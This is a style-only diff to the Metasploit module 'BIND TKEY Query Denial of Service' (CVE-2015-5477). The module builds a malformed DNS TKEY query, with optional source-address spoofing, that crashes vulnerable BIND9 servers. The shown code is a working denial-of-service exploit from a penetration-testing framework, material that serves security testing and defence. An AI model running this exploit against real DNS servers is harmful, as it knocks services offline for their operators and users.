@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,41 +7,39 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
   include Msf::Auxiliary::UDPScanner
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'BIND TKEY Query Denial of Service',
-      'Description'    => %q{
-        This module sends a malformed TKEY query, which exploits an
-        error in handling TKEY queries on affected BIND9 'named' DNS servers.
-        As a result, a vulnerable named server will exit with a REQUIRE
-        assertion failure. This condition can be exploited in versions of BIND
-        between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0
-        through 9.10.2-P2.
-      },
-      'Author'         => [
-        'Jonathan Foote',      # Original discoverer
-        'throwawayokejxqbbif', # PoC
-        'wvu'                  # Metasploit module
-      ],
-      'References'     => [
-        ['CVE', '2015-5477'],
-        ['URL', 'https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/'],
-        ['URL', 'https://kb.isc.org/article/AA-01272']
-      ],
-      'DisclosureDate' => 'Jul 28 2015',
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' => {'ScannerRecvWindow' => 0}
-    ))
+                      'Name'           => 'BIND TKEY Query Denial of Service',
+                      'Description'    => %q(
+                        This module sends a malformed TKEY query, which exploits an
+                        error in handling TKEY queries on affected BIND9 'named' DNS servers.
+                        As a result, a vulnerable named server will exit with a REQUIRE
+                        assertion failure. This condition can be exploited in versions of BIND
+                        between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0
+                        through 9.10.2-P2.
+                      ),
+                      'Author' => [
+                        'Jonathan Foote',      # Original discoverer
+                        'throwawayokejxqbbif', # PoC
+                        'wvu'                  # Metasploit module
+                      ],
+                      'References' => [
+                        ['CVE', '2015-5477'],
+                        ['URL', 'https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/'],
+                        ['URL', 'https://kb.isc.org/article/AA-01272']
+                      ],
+                      'DisclosureDate' => 'Jul 28 2015',
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' => { 'ScannerRecvWindow' => 0 }))
 
     register_options([
-      Opt::RPORT(53),
-      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
-    ])
+                       Opt::RPORT(53),
+                       OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
+                     ])
 
     deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
   end
@@ -61,9 +60,9 @@ class MetasploitModule < Msf::Auxiliary
     name_length = [name.length].pack('C')
     txt_length  = [txt.length].pack('C')
     data_length = [txt.length + 1].pack('n')
-    ttl         = [rand(2 ** 31 - 1) + 1].pack('N')
+    ttl         = [rand(2**31 - 1) + 1].pack('N')
 
-    query  = "\x00\x00"  # Transaction ID: 0x0000
+    query = "\x00\x00" # Transaction ID: 0x0000
     query << "\x00\x00"  # Flags: 0x0000 Standard query
     query << "\x00\x01"  # Questions: 1
     query << "\x00\x00"  # Answer RRs: 0
@@ -86,5 +85,4 @@ class MetasploitModule < Msf::Auxiliary
     query << txt_length  # TXT Length
     query << txt         # TXT
   end
-
 end
